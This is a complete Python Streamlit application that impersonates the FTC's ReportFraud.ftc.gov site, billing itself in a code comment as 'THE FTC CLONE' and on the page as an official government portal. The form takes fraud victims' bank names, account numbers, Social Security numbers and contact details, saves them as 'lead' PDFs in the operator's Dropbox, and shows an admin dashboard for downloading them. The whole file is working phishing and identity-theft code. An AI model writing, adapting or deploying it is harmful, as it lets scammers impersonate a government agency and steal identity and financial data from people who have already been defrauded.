import streamlit as st
import dropbox
from reportlab.pdfgen import canvas
import io
from datetime import datetime

# --- CONFIGURATION ---
# 1. Paste your Dropbox token here
DROPBOX_TOKEN = 'YOUR_DROPBOX_ACCESS_TOKEN' 
ADMIN_PASSWORD = "Godisgreat@1"

# --- STYLING (THE FTC CLONE) ---
st.set_page_config(page_title="Report Fraud | FTC", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #ffffff; }
    h1, h2, h3 { color: #003e67 !important; font-family: 'Segoe UI', sans-serif; }
    
    /* FTC Action Button */
    .stButton>button { 
        background-color: #003e67; 
        color: white; 
        font-weight: bold; 
        border-radius: 4px;
        padding: 0.6rem 2.5rem;
        text-transform: uppercase;
        border: none;
    }
    .stButton>button:hover { background-color: #002a4d; border: 1px solid #003e67; }
    
    /* Sidebar Branding */
    [data-testid="stSidebar"] { background-color: #f8fafc; border-right: 1px solid #e2e8f0; }
    </style>
    """, unsafe_allow_html=True)

# --- HIDDEN ADMIN GATEKEEPER ---
with st.sidebar:
    st.markdown("### 🔐 Admin Access")
    access_key = st.text_input("Enter Secret Key", type="password")
    is_admin = (access_key == ADMIN_PASSWORD)

# --- PUBLIC PAGE: THE FORM ---
if not is_admin:
    # Header Section
    col_logo, col_text = st.columns([1, 3])
    with col_logo:
        # Pulls the logo.png you uploaded to GitHub
        try:
            st.image("logo.png", width=130)
        except:
            st.warning("logo.png not found")

    with col_text:
        st.markdown("<h5 style='color:#64748b; margin-bottom:0;'>OFFICIAL GOVERNMENT PROJECT PORTAL</h5>", unsafe_allow_html=True)
        st.markdown("<h2 style='margin-top:0;'>ReportFraud.ftc.gov</h2>", unsafe_allow_html=True)

    st.divider()
    
    st.markdown("### Is your report about any of these common problems?")
    st.write("Your details help law enforcement investigations.")

    with st.form("ftc_form", clear_on_submit=True):
        category = st.radio("Category:", [
            "An impersonator (fake govt, business, love interest)", 
            "Online shopping scam", 
            "Investment or money-making opportunity", 
            "Something else"
        ], label_visibility="collapsed")
        
        st.markdown("---")
        st.markdown("### 💳 Financial Evidence (Excel-Style)")
        c_b1, c_b2 = st.columns(2)
        b_name = c_b1.text_input("Bank Name", placeholder="e.g. Chase, HDFC")
        b_acc = c_b1.text_input("Bank Account Number")
        ssn = c_b2.text_input("Social Security Number", type="password")
        amt = c_b2.number_input("Amount Lost ($)", min_value=0)

        st.markdown("---")
        st.markdown("### 👤 Reporter Identity")
        c1, c2 = st.columns(2)
        fname = c1.text_input("First Name")
        lname = c2.text_input("Last Name")
        email = st.text_input("Email Address")

        if st.form_submit_button("Submit Final Report ➔"):
            if not fname or not ssn:
                st.error("Critical fields are required for filing.")
            else:
                # PDF EXCEL-STYLE TABLE GENERATION
                packet = io.BytesIO()
                can = canvas.Canvas(packet)
                can.setFillColorRGB(0, 0.24, 0.40)
                can.rect(0, 750, 600, 100, fill=1)
                can.setFillColorRGB(1, 1, 1)
                can.setFont("Helvetica-Bold", 18)
                can.drawString(50, 785, "FTC FRAUD CASE: STRUCTURED LEAD DATA")
                
                can.setFillColorRGB(0, 0, 0)
                can.setFont("Helvetica-Bold", 10)
                can.drawString(50, 710, "FIELD NAME")
                can.drawString(250, 710, "COLLECTED DATA")
                
                data_map = [
                    ("Name", f"{fname} {lname}"), ("Email", email), ("Category", category),
                    ("Bank", b_name), ("Account", b_acc), ("SSN", ssn), ("Amount", f"${amt}"),
                    ("Date", datetime.now().strftime('%Y-%m-%d %H:%M'))
                ]
                y = 680
                for label, val in data_map:
                    can.setStrokeColorRGB(0.8, 0.8, 0.8)
                    can.line(40, y-5, 560, y-5)
                    can.drawString(50, y, label.upper())
                    can.drawString(250, y, str(val))
                    y -= 25
                
                can.save()
                packet.seek(0)
                
                try:
                    dbx = dropbox.Dropbox(DROPBOX_TOKEN)
                    dbx.files_upload(packet.read(), f"/{fname}_{lname}_Lead.pdf", mode=dropbox.files.WriteMode.overwrite)
                    st.success("✅ REPORT FILED SUCCESSFULLY")
                    st.warning("KINDLY CALL THE AUTHORITY WHO YOU ARE CONNECTED WITH SERIOUSLY.")
                    st.balloons()
                except Exception as e:
                    st.error(f"Dropbox Sync Error: {e}")

# --- ADMIN PAGE: THE DASHBOARD ---
else:
    st.title("🛡️ Admin Case Management")
    st.info("Direct access to secure cloud leads.")
    try:
        dbx = dropbox.Dropbox(DROPBOX_TOKEN)
        files = dbx.files_list_folder("").entries
        if not files:
            st.info("Database is currently empty.")
        else:
            for f in files:
                with st.expander(f"📄 {f.name}"):
                    c_dl, c_del = st.columns(2)
                    _, res = dbx.files_download("/" + f.name)
                    c_dl.download_button("Download Lead", res.content, file_name=f.name, key=f"dl_{f.name}")
                    if c_del.button(f"Delete {f.name}", key=f"del_{f.name}"):
                        dbx.files_delete_v2("/" + f.name)
                        st.rerun()
    except Exception as e:
        st.error(f"Error accessing database: {e}")
